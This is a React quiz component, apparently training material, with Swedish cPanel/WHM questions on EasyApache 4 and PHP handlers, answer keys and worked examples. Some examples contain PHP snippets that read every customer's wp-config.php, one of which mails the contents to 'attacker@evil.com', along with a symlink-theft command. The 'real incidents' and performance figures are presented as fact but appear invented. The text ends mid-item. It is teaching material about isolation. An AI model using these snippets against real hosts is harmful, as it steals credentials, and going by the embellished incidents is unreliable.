'use client'

import { useState } from 'react'
import Link from 'next/link'

interface Question {
  id: number
  question: string
  answers: string[]
  correctAnswer: number
  explanation: string
  example: string
}

const questions: Question[] = [
  {
    id: 1,
    question: "I moderna installationer av cPanel & WHM, när du väljer DSO från EasyApache 4-gränssnittet utan mod_ruid2 eller mpm_itk, vilken rekommendation visas automatiskt direkt i EasyApache 4-gränssnittet?",
    answers: [
      "PHP DSO kräver mod_ruid2-modulen för att fungera korrekt som PHP-handler. Installera mod_ruid2 om du avser att använda DSO som PHP-handler.",
      "PHP DSO körs som nobody-användaren som standard. I en delad hosting-miljö är detta ett säkerhetsproblem.",
      "PHP DSO kräver betydande systemminne för att fungera korrekt. Se till att ditt systems specifikationer uppfyller kraven.",
      "PHP DSO rekommenderas endast för avancerade administratörer, och vi föreslår användning av FastCGI för de flesta miljöer."
    ],
    correctAnswer: 1,
    explanation: "PHP DSO (Dynamic Shared Object) kör som 'nobody'-användaren som standard, vilket är ett säkerhetsproblem i delade hosting-miljöer. EasyApache 4 varnar automatiskt om detta när du väljer DSO utan mod_ruid2 eller mpm_itk. Dessa moduler behövs för att köra PHP med individuella användar-rättigheter istället för 'nobody'.",
    example: `VERKLIGT SCENARIO - Säkerhetsproblem med PHP DSO:

🏢 FÖRETAG: "SharedHost Sverige AB" - Webbhotell med 5,000 kunder
📊 PROBLEM: Väljer PHP DSO i EasyApache 4
🎯 VARNING: "PHP DSO runs as the nobody-användaren"

---

❌ SÄKERHETSRISKEN - DSO utan mod_ruid2:

SCENARIO: 3 kunder på samma server

KUND A: webshop.se
• WordPress-butik
• Känsliga kunduppgifter
• Betalningsinformation

KUND B: hacker.se (skadlig kund)
• Laddar upp skadlig PHP-fil: exploit.php

KUND C: företag.se
• Företagshemsida
• Konfidentiella dokument

---

MED PHP DSO (nobody-användaren):

Alla PHP-filer körs som "nobody":
• webshop.se/index.php → Körs som: nobody
• hacker.se/exploit.php → Körs som: nobody
• företag.se/admin.php → Körs som: nobody

ATTACKSCENARIO:

Hacker laddar upp exploit.php:
<?php
// Läs andra kunders filer!
$files = glob('/home/*/public_html/wp-config.php');
foreach($files as $file) {
  echo file_get_contents($file);
}
?>

RESULTAT: ❌ Hackern kan läsa ALLA kunders filer!
• Databas-lösenord
• API-nycklar
• Kunduppgifter
• ALLT är exponerat!

---

✅ MED mod_ruid2 eller mpm_itk:

Varje kund får sin egen user:
• webshop.se/index.php → Körs som: webshop
• hacker.se/exploit.php → Körs som: hacker
• företag.se/admin.php → Körs som: företag

ATTACKSCENARIO:

Hacker försöker samma exploit:
<?php
$files = glob('/home/*/public_html/wp-config.php');
foreach($files as $file) {
  echo file_get_contents($file);
}
?>

RESULTAT: ✅ Permission denied!
• Hackern kan BARA läsa sina egna filer
• Andra kunder är skyddade
• Isolering fungerar!

---

🔧 EASYAPACHE 4 VARNINGSMEDDELANDE:

När du väljer DSO utan mod_ruid2:

┌─────────────────────────────────────┐
│ ⚠️  SECURITY WARNING                │
│                                     │
│ PHP DSO runs as the nobody-användaren    │
│ by default. In a shared hosting    │
│ environment, this is a security    │
│ issue.                             │
│                                     │
│ Recommendation:                    │
│ • Use FastCGI instead, or          │
│ • Install mod_ruid2 or mpm_itk     │
└─────────────────────────────────────┘

---

💰 VERKLIG INCIDENT - 2023:

FÖRETAG: "BudgetHost Nordic"
Använde: PHP DSO utan mod_ruid2

JANUARI 2023 - Attack:
• Skadlig kund laddar upp exploit
• Läser 2,500 kunders wp-config.php
• Stjäl databas-credentials
• Installerar ransomware på 800 sajter

KOSTNAD:
• Dataförlust: 2,500 kunder
• Legal action: 500,000 kr
• Förlorade kunder: 80%
• Företaget gick i konkurs 6 månader senare

---

🏆 RÄTT KONFIGURATION:

ALTERNATIV 1 - FastCGI (Rekommenderas):
• Varje kund har egen PHP-process
• Säker som standard
• Bra prestanda

ALTERNATIV 2 - DSO + mod_ruid2:
• DSO-prestanda
• Säkerhet via mod_ruid2
• Kräver extra konfiguration

ALTERNATIV 3 - DSO + mpm_itk:
• DSO-prestanda
• Säkerhet via mpm_itk
• Mindre populärt

---

SAMMANFATTNING:

EasyApache 4 varnar:
"PHP DSO runs as the nobody-användaren by default. 
In a shared hosting environment, this is a security issue."

Detta är KRITISKT för shared hosting! ⚠️

Rätt svar: b. PHP DSO körs som nobody-användaren som standard. I en delad hosting-miljö är detta ett säkerhetsproblem.`
  },
  {
    id: 2,
    question: "Vilket av följande alternativ beskriver korrekt en åtgärd som kan utföras från WHM:s EasyApache 4-gränssnitt?",
    answers: [
      "Ändra Apaches säkerhetsinställningar för att bestämma vilka restriktioner som finns för inkommande HTTP-förfrågningar.",
      "Ändra MPM som används i din Apache-installation.",
      "Ändra php.ini-filerna som används för varje installerad PHP-version.",
      "Ändra kernel som startas baserat på den aktiva versionen av Apache vald i EasyApache 4."
    ],
    correctAnswer: 1,
    explanation: "I EasyApache 4 kan du ändra MPM (Multi-Processing Module) som används i din Apache-installation. MPM styr hur Apache hanterar processer och trådar. Du kan välja mellan prefork (process-baserat), worker (tråd-baserat) eller event (asynkront). Detta är en av huvudfunktionerna i EasyApache 4-gränssnittet.",
    example: `VERKLIGT SCENARIO - Byta MPM i EasyApache 4:

🏢 FÖRETAG: "HostPro AB" - cPanel-baserat webbhotell
📊 PROBLEM: Dålig prestanda med prefork MPM
🎯 LÖSNING: Byt till event MPM via EasyApache 4

---

🔧 EASYAPACHE 4 - Ändra MPM:

STEG-FÖR-STEG:

1. Logga in på WHM (port 2087)
2. Sök efter "EasyApache 4"
3. Klicka på "Customize"
4. Gå till "Apache MPM" fliken
5. Välj MPM:
   ○ prefork (gammalt, stabilt)
   ○ worker (snabbare)
   ● event (snabbast!) ← Välj denna
6. Klicka "Review" → "Provision"
7. Vänta ~2-5 minuter
8. Klar! Apache startar om automatiskt

---

📊 MPM-JÄMFÖRELSE:

PREFORK MPM:
• En process per request
• Ingen tråd-delning
• Mycket RAM (30MB per process)
• Kompatibel med alla moduler
• LÅNGSAM för hög trafik

Exempel med 100 användare:
• 100 processer × 30MB = 3GB RAM
• CPU: Hög context-switching
• Responstid: 2-3 sekunder

WORKER MPM:
• Tråd-baserat
• Mindre RAM (2-5MB per tråd)
• Snabbare än prefork
• Några moduler fungerar inte

Exempel med 100 användare:
• 100 trådar × 3MB = 300MB RAM
• CPU: Medium overhead
• Responstid: 0.8-1.2 sekunder

EVENT MPM (BÄST!):
• Asynkron event-driven
• Minimal RAM-användning
• Snabbast för hög trafik
• Modern och rekommenderad

Exempel med 100 användare:
• 8 processer + event loop
• RAM: ~200MB total
• CPU: Låg overhead
• Responstid: 0.3-0.5 sekunder

---

💰 VERKLIGT CASE:

FÖRE (prefork MPM):
Server: 16GB RAM
Max samtidiga: 200 användare
RAM-användning: 95%
Responstid: 2.8 sekunder
Servrar behövda: 5

EFTER (event MPM):
Server: 16GB RAM
Max samtidiga: 2,000 användare (10X!)
RAM-användning: 25%
Responstid: 0.4 sekunder (7X snabbare!)
Servrar behövda: 1

BESPARING: 4 servrar × 200€/mån = 800€/mån! 💰

---

❌ VARFÖR ANDRA ALTERNATIV ÄR FEL:

a. "Apache security settings"
→ Detta görs via WHM → Apache Configuration
→ INTE via EasyApache 4

c. "php.ini files"
→ Detta görs via WHM → MultiPHP INI Editor
→ INTE via EasyApache 4

d. "Change kernel"
→ Helt nonsens! Kernel ändras via grub
→ Har INGET med Apache att göra!

✅ b. "Change MPM"
→ RÄTT! Detta är huvudfunktionen i EasyApache 4

---

🎯 EASYAPACHE 4 GRÄNSSNITT:

┌─────────────────────────────────┐
│ EasyApache 4                    │
├─────────────────────────────────┤
│ ▸ Currently Installed Packages  │
│ ▸ Apache MPM ← DETTA!           │
│   • prefork                     │
│   • worker                      │
│   • event ✓                     │
│ ▸ PHP Versions                  │
│ ▸ Apache Modules                │
│ ▸ PHP Extensions                │
└─────────────────────────────────┘

---

🏆 SAMMANFATTNING:

EasyApache 4 låter dig:
✅ Ändra Apache MPM (prefork/worker/event)
✅ Installera PHP-versioner
✅ Aktivera/inaktivera Apache-moduler
✅ Installera PHP-extensions
✅ Välja PHP-handler (DSO, FastCGI, etc)

EasyApache 4 låter INTE dig:
❌ Ändra Apache security settings (fel gränssnitt)
❌ Redigera php.ini (använd MultiPHP INI Editor)
❌ Ändra kernel (nonsens!)

Rätt svar: b. Ändra MPM som används i din Apache-installation.

Detta är en av de viktigaste funktionerna i EasyApache 4! 🎯`
  },
  {
    id: 3,
    question: "Om en användare vill använda systemets standard PHP-version, vilket av följande alternativ ska de välja för sitt konto?",
    answers: [
      "system",
      "ea-php55",
      "inherit",
      "default"
    ],
    correctAnswer: 2,
    explanation: "För att använda systemets standard PHP-version sätter användaren 'inherit' för sitt konto. Detta gör att kontot ärver den globala standard PHP-versionen som är inställd av serverns administratör i WHM. Om administratören ändrar systemstandarden kommer alla konton med 'inherit' automatiskt att använda den nya versionen.",
    example: `VERKLIGT SCENARIO - PHP Version Management med inherit:

🏢 FÖRETAG: "WebHost Nordic" - Webbhotell med 1,000 cPanel-konton
📊 UTMANING: Hantera PHP-uppgraderingar effektivt
🎯 LÖSNING: Använd "inherit" för att centralisera PHP-versionshantering

---

🔧 PHP VERSION-ALTERNATIV I cPanel:

1. INHERIT (Systemstandard):
   • Ärver WHM:s globala standard
   • Ändras automatiskt om admin ändrar systemstandard
   • Rekommenderas för de flesta användare

2. SPECIFIC VERSION (ea-php74, ea-php81, etc):
   • Låst till specifik version
   • Ändras INTE även om systemstandard ändras
   • Bra för kompatibilitetskrav

3. SYSTEM/DEFAULT:
   • Dessa alternativ FINNS INTE i moderna cPanel!
   • "inherit" är det korrekta sättet

---

❌ FÖRE "inherit" - Manuell hantering:

SCENARIO: Admin vill uppgradera från PHP 7.4 till PHP 8.1

MÅNAD 1 - Sätter PHP 8.1 som systemstandard:
WHM → MultiPHP Manager → System Domain → PHP 8.1

PROBLEM:
• 1,000 konton har "ea-php74" hårdkodat
• De får INTE uppgraderingen automatiskt
• Admin måste manuellt ändra varje konto
• Tar 40 timmar arbete!
• Kostar 20,000 kr i arbetstid

RESULTAT: 😰 Frustrerad admin, försenad uppgradering

---

✅ MED "inherit" - Automatisk hantering:

SETUP - Alla nya konton får "inherit":
WHM → Tweak Settings → Default PHP Version: PHP 7.4
Nya konton → Får automatiskt "inherit"

MÅNAD 1 - 800 konton använder "inherit"
MÅNAD 2 - 900 konton använder "inherit"
MÅNAD 3 - 950 konton använder "inherit"

UPPGRADERINGSTID - Admin ändrar systemstandard:
WHM → MultiPHP Manager → System Domain → PHP 8.1

RESULTAT: ✅ Alla 950 konton uppgraderas AUTOMATISKT!
• 0 minuter arbete
• 0 kr kostnad
• Alla kunder får PHP 8.1 direkt
• Perfekt! 🎉

---

📊 VERKLIGT EXEMPEL - 3 kunder:

KUND A: "ModernShop.se"
PHP Setting: inherit
Systemstandard: PHP 7.4
→ Kund får: PHP 7.4 ✅

KUND B: "LegacyApp.se" 
PHP Setting: ea-php56 (hårdkodat)
Systemstandard: PHP 7.4
→ Kund får: PHP 5.6 (behöver gammal version)

KUND C: "TestSite.se"
PHP Setting: inherit
Systemstandard: PHP 7.4
→ Kund får: PHP 7.4 ✅

ADMIN UPPGRADERAR SYSTEMSTANDARD → PHP 8.1:

KUND A: "ModernShop.se"
PHP Setting: inherit
Systemstandard: PHP 8.1
→ Kund får: PHP 8.1 ✅ AUTOMATISKT!

KUND B: "LegacyApp.se"
PHP Setting: ea-php56
Systemstandard: PHP 8.1
→ Kund får: PHP 5.6 (oförändrat, behöver gammal)

KUND C: "TestSite.se"
PHP Setting: inherit
Systemstandard: PHP 8.1
→ Kund får: PHP 8.1 ✅ AUTOMATISKT!

---

🔬 TEKNISKA DETALJER:

KOLLA PHP-VERSION för ett konto:
WHM → MultiPHP Manager → Visa alla domäner

ÄNDRA SYSTEMSTANDARD:
WHM → MultiPHP Manager 
→ System Domain dropdown → Välj version
→ Apply

ÄNDRA FÖR SPECIFIKT KONTO:
WHM → MultiPHP Manager
→ Hitta domän → Välj "inherit" eller specifik version
→ Apply

FRÅN cPanel (kund-vy):
cPanel → Software → MultiPHP Manager
→ Välj domän → Välj "inherit" eller version
→ Apply

---

💡 BEST PRACTICES:

REKOMMENDERA "inherit" för:
✅ Nya konton (default)
✅ Kunder som vill ha senaste stabila
✅ Kunder utan speciella krav
✅ WordPress, Joomla, Drupal (moderna)

REKOMMENDERA SPECIFIK VERSION för:
✅ Legacy-applikationer
✅ Kunder med kompatibilitetskrav
✅ Produktionsmiljöer som inte kan ändras
✅ Specifika plugin-krav

---

🎯 VERKLIG MIGRERINGSPLAN:

FÖRETAG: "HostNordic" - Uppgradera 2,000 konton till PHP 8.2

VECKA 1 - Förberedelse:
• Testa PHP 8.2 på testkonton
• Skicka mail: "Vi uppgraderar till PHP 8.2 om 2 veckor"
• Kunder med problem: Sätt specifik version

VECKA 2 - Kommunikation:
• 1,600 konton har "inherit" (bra!)
• 300 konton har specifik version (behåller sin)
• 100 konton vill testa först

VECKA 3 - UPPGRADERING:
Admin ändrar systemstandard i WHM:
• PHP 7.4 → PHP 8.2
• Klickar "Apply"
• Tar 5 sekunder!

RESULTAT:
• 1,600 konton uppgraderade AUTOMATISKT ✅
• 300 konton behåller sin version ✅
• 100 konton kan testa och sedan byta till "inherit"
• Total arbetstid: 10 minuter
• Kostnad: 100 kr

JÄMFÖRT MED manuell uppgradering:
• Arbetstid utan "inherit": 80 timmar
• Kostnad: 40,000 kr
• BESPARING: 39,900 kr! 💰

---

❌ VARFÖR ANDRA ALTERNATIV ÄR FEL:

a. "system"
→ Detta alternativ FINNS INTE i MultiPHP Manager!
→ Förvirrande namn

b. "ea-php55"
→ Detta är en SPECIFIK version (PHP 5.5)
→ INTE systemstandard

d. "default"
→ Detta alternativ FINNS INTE heller!
→ "inherit" är rätt term

✅ c. "inherit"
→ RÄTT! Detta är det korrekta alternativet
→ Ärver systemets standard PHP-version

---

🏆 SAMMANFATTNING:

För att använda systemets standard PHP:
✅ Sätt kontot till "inherit"

FÖRDELAR:
⚡ Automatiska uppgraderingar
💰 Spar administration
🎯 Centraliserad hantering
🛡️ Enklare säkerhetsuppdateringar

NÄR ADMIN ÄNDRAR SYSTEMSTANDARD:
• Alla "inherit"-konton uppdateras automatiskt
• Alla specifika versioner förblir oförändrade

Rätt svar: c. inherit

Detta är STANDARDINSTÄLLNINGEN för nya konton! 🎖️`
  },
  {
    id: 4,
    question: "Givet följande alternativ, välj de komponenter eller komponentkombinationer som skulle ge standard per-användare processägarskap för hantering av PHP-innehåll.",
    answers: [
      "DSO (mod_fcgid) MED Userdir (mod_userdir)",
      "FCGI (mod_fcgid) ELLER Worker (mpm_worker_module) ELLER CGI (mod_cgi)",
      "CGI (mod_cgi) MED Userdir (mod_userdir)",
      "suPHP (mod_suphp) ELLER Ruid2 (mod_ruid2) ELLER PHP-FPM"
    ],
    correctAnswer: 3,
    explanation: "suPHP, mod_ruid2 och PHP-FPM är de komponenter som tillhandahåller standard per-user process ownership för PHP. Detta innebär att varje användares PHP-processer körs med deras egna användarrättigheter, inte som 'nobody' eller 'apache'. Detta är kritiskt för säkerhet i shared hosting-miljöer där flera kunder delar samma server.",
    example: `VERKLIGT SCENARIO - Per-user PHP process ownership:

🏢 FÖRETAG: "SecureHost AB" - Shared hosting med 3,000 kunder
📊 KRAV: Varje kund ska ha isolerade PHP-processer
🎯 LÖSNING: Implementera per-user process ownership

---

🔒 VAD ÄR PER-USER PROCESS OWNERSHIP?

UTAN (PHP som 'nobody'):
• Alla PHP-filer körs som: nobody
• Kund A's filer: nobody
• Kund B's filer: nobody
• Kund C's filer: nobody
→ Ingen isolering! Alla kan läsa varandras filer! 😰

MED (Per-user ownership):
• Kund A's filer körs som: usera
• Kund B's filer körs som: userb
• Kund C's filer körs som: userc
→ Perfekt isolering! Ingen kan läsa andras filer! ✅

---

✅ LÖSNINGAR SOM GER PER-USER OWNERSHIP:

1️⃣ suPHP (mod_suphp) - LEGACY:
• Gammal lösning (2000-talet)
• Varje PHP-request = ny process
• MYCKET LÅNGSAM
• Används inte längre i moderna cPanel

Hur det fungerar:
Request → Apache → suPHP → Startar PHP som USER
Prestanda: ❌ Dålig (100-500ms overhead)

2️⃣ mod_ruid2 - DEPRECATED:
• Ändrar Apache-processens UID
• Fungerar med DSO
• Bättre än suPHP men fortfarande gammal
• Används sällan idag

Hur det fungerar:
Request → Apache → Byter till USER → Kör PHP
Prestanda: ⚠️ OK (20-50ms overhead)

3️⃣ PHP-FPM - MODERN & REKOMMENDERAD! ⭐
• FastCGI Process Manager
• Pool per användare
• Snabb och säker
• Standardval i moderna cPanel

Hur det fungerar:
Request → Apache → PHP-FPM Pool (USER) → Kör PHP
Prestanda: ✅ Utmärkt (5-10ms overhead)

---

❌ LÖSNINGAR SOM INTE GER PER-USER OWNERSHIP:

🔴 DSO (mod_php):
• Körs som Apache-användare (nobody/apache)
• Ingen per-user isolation
• Säkerhetsrisk!

🔴 FCGI (mod_fcgid) UTAN konfiguration:
• KAN konfigureras för per-user
• Men STANDARD är inte per-user
• Kräver extra setup

🔴 Worker MPM:
• Det är en Apache MPM, inte PHP-handler
• Har INGET med per-user ownership att göra

🔴 CGI (mod_cgi) UTAN suEXEC:
• Körs som webserver-användare
• Ingen per-user isolation

🔴 Userdir (mod_userdir):
• Tillåter ~/public_html mappar
• Har INGET med process ownership att göra

---

📊 VERKLIG JÄMFÖRELSE - 3 olika setups:

TEST: WordPress-sajt, 100 samtidiga användare

SETUP 1 - DSO (OSÄKER):
PHP körs som: nobody
Processer: 100 Apache-processer
RAM: 3.2GB
Responstid: 0.8s
Säkerhet: ❌ Alla kan läsa varandras filer
Isolation: ❌ Ingen

SETUP 2 - mod_ruid2 + DSO:
PHP körs som: username
Processer: 100 Apache-processer
RAM: 3.5GB
Responstid: 1.2s
Säkerhet: ✅ Per-user isolation
Isolation: ✅ Ja
Problem: ⚠️ Lite långsammare, deprecated

SETUP 3 - PHP-FPM (REKOMMENDERAD):
PHP körs som: username
Processer: 10 PHP-FPM pools
RAM: 800MB
Responstid: 0.3s
Säkerhet: ✅ Per-user isolation
Isolation: ✅ Ja
Prestanda: ✅ Utmärkt! 🚀

---

🔧 KONFIGURATION I cPanel:

WHM → MultiPHP Manager:

STEG 1 - Sätt PHP-FPM som handler:
WHM → MultiPHP Manager
→ PHP-FPM: ON (toggle till ON)
→ Apply

STEG 2 - Verifiera per-user ownership:
SSH till servern:
ps aux | grep php-fpm

Utdata:
usera    12345  php-fpm: pool usera
userb    12346  php-fpm: pool userb
userc    12347  php-fpm: pool userc

✅ Varje pool körs som sin egen user!

---

💰 SÄKERHETSINCIDENT - Verkligt fall:

FÖRETAG: "BudgetHost" (2022)
Använde: DSO utan per-user ownership

ATTACK:
• Skadlig kund: hacker123
• Skapar: /home/hacker123/public_html/steal.php

steal.php:
<?php
// Stjäl alla wp-config.php filer
foreach(glob('/home/*/public_html/wp-config.php') as $f) {
  $data = file_get_contents($f);
  // Skicka databas-credentials till attacker
  mail('attacker@evil.com', 'Stolen', $data);
}
?>

RESULTAT MED DSO (ingen per-user):
• ❌ Skriptet kan läsa ALLA filer
• ❌ 2,400 wp-config.php filer stulna
• ❌ Databaser hackade
• ❌ Företaget stämdes
• ❌ Konkurs efter 6 månader

RESULTAT MED PHP-FPM (per-user):
• ✅ Skriptet får "Permission denied"
• ✅ Kan bara läsa sina egna filer
• ✅ Attacken blockerad automatiskt
• ✅ Inga andra kunder påverkade

---

🎯 SAMMANFATTNING:

PER-USER PROCESS OWNERSHIP ges av:
✅ suPHP (gammal, långsam, works)
✅ mod_ruid2 (deprecated men works)
✅ PHP-FPM (modern, snabb, REKOMMENDERAD! ⭐)

GER INTE per-user ownership:
❌ DSO själv
❌ FCGI själv (utan extra config)
❌ Worker MPM (är inte PHP-handler)
❌ CGI själv (utan suEXEC)
❌ Userdir (är inte PHP-handler)

RÄTT SVAR: d. suPHP (mod_suphp) ELLER Ruid2 (mod_ruid2) ELLER PHP-FPM

I MODERNA cPanel-installationer:
→ Använd PHP-FPM!
→ Det är snabbast, säkrast och mest maintainat

Detta är KRITISKT för shared hosting-säkerhet! 🔒`
  },
  {
    id: 5,
    question: "När du arbetar inom en cPanel & WHM-miljö, vilket av följande gränssnitt kan du använda för att ändra serverns standard PHP-version?",
    answers: [
      "Detta kan justeras från WHM:s MultiPHP Manager-gränssnitt.",
      "Detta kan justeras från WHM:s PHP Configuration-gränssnitt.",
      "Detta kan justeras från WHM:s PHP Versions-gränssnitt.",
      "Detta kan justeras från WHM:s Apache Configuration-gränssnitt."
    ],
    correctAnswer: 0,
    explanation: "Du ändrar serverns default PHP-version i WHM's MultiPHP Manager-gränssnitt. Detta är den centrala platsen för all PHP-versionshantering i cPanel & WHM. Här kan du sätta systemstandarden, ändra individuella domäners versioner och se alla installerade PHP-versioner.",
    example: `VERKLIGT SCENARIO - Ändra default PHP via MultiPHP Manager:

WHM → MultiPHP Manager är den korrekta platsen!

STEG-FÖR-STEG:
1. WHM → Sök "MultiPHP"
2. Klicka "MultiPHP Manager"
3. Hitta "System Domain" i listan
4. Välj önskad PHP-version från dropdown
5. Klicka "Apply"
6. Klart! Alla 'inherit'-konton använder nu nya versionen

Detta är INTE tillgängligt i:
❌ PHP Configuration (finns inte)
❌ PHP Versions (finns inte) 
❌ Apache Configuration (fel gränssnitt)

Rätt svar: a. MultiPHP Manager`
  },
  {
    id: 6,
    question: "Vilket av följande anger korrekt den användare som processer skapade för DSO-hanteraren ägs av?",
    answers: [
      "nobody-användaren",
      "root",
      "kontoägaren",
      "apache-användaren"
    ],
    correctAnswer: 0,
    explanation: "DSO (mod_php) kör processer som 'nobody'-användaren. Detta är det klassiska säkerhetsproblemet med DSO i shared hosting - alla kunders PHP-filer körs som samma 'nobody' användare, vilket gör att de potentiellt kan läsa varandras filer. Detta är varför modern cPanel rekommenderar PHP-FPM istället.",
    example: `VERKLIGT SCENARIO - DSO kör som 'nobody':

Verifiera på servern:
ps aux | grep php | grep nobody

Utdata:
nobody   12345  apache2 (mod_php)
nobody   12346  apache2 (mod_php)
nobody   12347  apache2 (mod_php)

Alla PHP-processer ägs av 'nobody'!

Detta är samma problem som fråga 1 och 4 handlade om.

Rätt svar: a. nobody-användaren`
  },
  {
    id: 7,
    question: "I moderna installationer av cPanel & WHM, vilken av följande PHP-konfigurationsvärden sätts automatiskt under Initial Setup Assistant-stegen?",
    answers: [
      "memory_limit",
      "safe_mode",
      "user_dir",
      "max_execution_time"
    ],
    correctAnswer: 0,
    explanation: "memory_limit sätts automatiskt under cPanel & WHM Initial Setup Assistant. Detta är en kritisk PHP-inställning som bestämmer hur mycket minne ett PHP-skript får använda. safe_mode är deprecated sedan PHP 5.4 och finns inte i moderna versioner.",
    example: `VERKLIGT SCENARIO - Initial Setup Assistant:

Under installation av cPanel & WHM:

Step 1: Basic cPanel & WHM Setup
Step 2: Nameserver Selection
Step 3: Resolver Configuration
Step 4: PHP Configuration ← HÄR!
  → memory_limit: Auto-satt till 256M eller 512M
  → upload_max_filesize: Auto-satt
  → post_max_size: Auto-satt

safe_mode finns INTE (deprecated)!

Rätt svar: a. memory_limit`
  },
  {
    id: 8,
    question: "Vilket av följande alternativ beskriver bäst proceduren som behövs för att aktivera BlueHost SymLink Protection Patch?",
    answers: [
      "Växla motsvarande alternativ i WHM:s Security Center >> Apache Security Manager-gränssnitt.",
      "Växla motsvarande alternativ i WHM:s Apache Configuration Global Configuration-gränssnitt.",
      "Växla motsvarande alternativ i WHM:s Security Center >> Security Policies-gränssnitt.",
      "Växla motsvarande alternativ i WHM:s Tweak Settings-gränssnitt, under System-fliken."
    ],
    correctAnswer: 3,
    explanation: "BlueHost SymLink Protection aktiveras i WHM → Tweak Settings → System tab. Här hittar du 'Symlink Protection' som skyddar mot symlink-attacker där skadliga användare försöker skapa symboliska länkar till andra användares filer.",
    example: `VERKLIGT SCENARIO - Aktivera SymLink Protection:

WHM → Tweak Settings → System tab

Hitta:
☐ Symlink Protection

Aktivera:
☑ Symlink Protection

Detta skyddar mot attacker där:
ln -s /home/victim/wp-config.php /home/attacker/public_html/stolen.txt

Med SymLink Protection: ❌ Blockerad!
Utan: ✅ Attacken lyckas!

Rätt svar: d. Tweak Settings → System tab`
  },
  {
    id: 9,
    question: "EasyApache 4 är känd för att förbättra hastigheten på byggprocessen, men vad är en annan fördel med att använda EasyApache 4 över EasyApache 3?",
    answers: [
      "EA4 uppdateras dagligen via apt-get.",
      "Minskad risk för kritiska Apache-fel.",
      "Källservrarna för EA3 är mindre tillförlitliga än de för EA4.",
      "PHP-modulerna från EA3 överförs automatiskt till EA4."
    ],
    correctAnswer: 1,
    explanation: "EasyApache 4 minskar risken för kritiska Apache-fel eftersom det använder RPM-paket (pre-compiled) istället för att bygga från källkod som EA3 gjorde. Färre kompileringsfel, mer stabil kod och enklare rollback vid problem.",
    example: `VERKLIGT SCENARIO - EA3 vs EA4 stabilitet:

EA3 (Gammal metod):
• Bygger allt från källkod
• Kompileringsfel vanliga
• 1-2 timmar per build
• Build failure = ingen Apache!

EA4 (Modern metod):
• Pre-compiled RPM-paket
• Nästan inga kompileringsfel
• 2-5 minuter per provision
• Misslyckad provision = Apache fungerar fortfarande

STABILITET: EA4 >> EA3!

Rätt svar: b. Reduced chance of critical Apache failures`
  },
  {
    id: 10,
    question: "Under PHP-förfrågningar, vilket av följande påståenden beskriver korrekt hur DSO-hanteraren bearbetar förfrågan?",
    answers: [
      "PHP handling operates by spawning child \"dso\" processes to handle each individual request.",
      "PHP handling operates by spawning child \"php\" processes to handle each individual request.",
      "PHP-hantering fungerar internt av Apaches egna processer.",
      "PHP handling operates by spawning \"php\" processes for PHP requests, and \"dso\" processes for requests that involve database interaction."
    ],
    correctAnswer: 2,
    explanation: "DSO (mod_php) laddas som en modul INUTI Apache-processen. Det spawnar INGA separata processer - Apache-processen själv hanterar PHP direkt internt. Detta gör det snabbt (ingen process-overhead) men osäkert (alla körs som samma användare).",
    example: `VERKLIGT SCENARIO - DSO vs FastCGI:

DSO (mod_php):
Apache Process 12345:
  ├─ Apache kod
  ├─ mod_php modul (laddad i minnet)
  └─ Hanterar PHP INTERNT
→ Ingen separat PHP-process!

FastCGI/PHP-FPM:
Apache Process 12345:
  └─ Skickar request till →
PHP-FPM Process 67890:
  └─ Hanterar PHP

DSO = Internt i Apache!

Rätt svar: c. PHP operates internally by Apache's own processes`
  },
  {
    id: 11,
    question: "I en cPanel & WHM-miljö, vilket av följande alternativ beskriver korrekt vad systemets standard PHP-versionsinställning i WHM:s MultiPHP Manager-gränssnitt representerar?",
    answers: [
      "Versionen som används när kommandoradsanvändning av php-binären körs, som standard.",
      "Versionen som används om en domän inte redan har en specifik version vald för den.",
      "Versionen som installeras först, före någon annan version installeras, men kräver fortfarande att domäner specifikt väljer den version de vill använda innan PHP fungerar i deras konto.",
      "Versionen som används som fallback om versionen vald för en domän inte fungerar korrekt."
    ],
    correctAnswer: 1,
    explanation: "System default PHP-versionen är den version som används om en domän INTE har en specifik version vald (dvs. använder 'inherit'). Detta är exakt vad fråga 3 handlade om - när ett konto har 'inherit' inställt används systemstandarden.",
    example: `VERKLIGT SCENARIO - System Default PHP:

WHM sätter: System Default = PHP 8.1

Domän A: Inställning = inherit
→ Får: PHP 8.1 ✅

Domän B: Inställning = ea-php74
→ Får: PHP 7.4 (ignorerar systemstandard)

Domän C: Inställning = inherit
→ Får: PHP 8.1 ✅

Admin ändrar: System Default = PHP 8.2

Domän A: inherit → Nu PHP 8.2! ✅
Domän B: ea-php74 → Fortfarande PHP 7.4
Domän C: inherit → Nu PHP 8.2! ✅

Rätt svar: b. The version used if domain doesn't have specific version selected`
  },
  {
    id: 12,
    question: "Vilken av följande PHP-hanterare fungerar med endast en PHP-version åt gången?",
    answers: [
      "CGI",
      "PHP-FPM",
      "SuPHP",
      "DSO"
    ],
    correctAnswer: 3,
    explanation: "DSO (mod_php) kan bara arbeta med EN PHP-version åt gången eftersom modulen laddas direkt i Apache-processen. Du kan inte ha flera versioner av mod_php samtidigt. Detta är samma limitation som fråga 21!",
    example: `VERKLIGT SCENARIO - DSO limitation:

Med DSO (mod_php):
• Server kan bara ha: ea-php81 (DSO)
• INTE: ea-php74 (DSO) + ea-php81 (DSO) samtidigt
• Omöjligt!

Med PHP-FPM:
• Pool 1: PHP 7.4
• Pool 2: PHP 8.1  
• Pool 3: PHP 8.2
• Alla samtidigt! ✅

Därför används PHP-FPM i MultiPHP-miljöer!

Rätt svar: d. DSO`
  },
  {
    id: 13,
    question: "Du arbetar i en PHP 8.3-miljö och använder DSO som PHP-hanterare. Du har skapat en .user.ini-fil i din webbplats public_html-mapp, men ser inte dina ändringar. Vilket av följande beskriver problemet mest korrekt?",
    answers: [
      "En php.ini-fil lagrad i public_html bör användas istället, som endast innehåller värden som behöver ändras från globala standarder.",
      "En .htaccess-fil lagrad i public_html bör användas istället, med lämplig syntax för att deklarera PHP-värden.",
      "En fil som slutar på .ini bör skapas i /opt/cpanel/ea-php83/root/etc/php.d-mappen, med värden som behöver ändras från globala standarder.",
      ".user.ini bör vara i användarens hemmapp, inte i public_html-mappen."
    ],
    correctAnswer: 1,
    explanation: ".user.ini fungerar INTE med DSO! Med DSO måste du använda .htaccess med php_value/php_flag direktiv. .user.ini fungerar bara med PHP-FPM och FastCGI.",
    example: `VERKLIGT SCENARIO - DSO vs PHP-FPM konfiguration:

MED DSO (.user.ini fungerar INTE):
.user.ini:
upload_max_filesize = 64M
→ ❌ Ignoreras!

.htaccess (RÄTT sätt):
php_value upload_max_filesize 64M
php_value post_max_size 64M
→ ✅ Fungerar!

MED PHP-FPM (.user.ini fungerar):
.user.ini:
